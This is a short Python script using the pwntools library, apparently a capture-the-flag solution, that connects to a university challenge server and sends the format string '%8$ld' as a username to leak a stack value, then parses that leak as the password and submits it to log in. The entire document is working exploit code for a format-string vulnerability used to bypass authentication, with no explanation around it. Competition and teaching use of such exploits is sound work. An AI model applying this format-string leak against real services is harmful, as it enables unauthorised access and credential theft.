from pwn import *

r = remote("cyberchallenge.disi.unitn.it", 9005)

r.sendlineafter(
    b"username: ",
    b"%8$ld"
)

password = r.recvline().strip().split(b" ")[-1]

log.info(f"Password: {password.decode()}")

r.sendlineafter(
    b"Password: ",
    password
)

print(r.recvall().decode(errors="ignore"))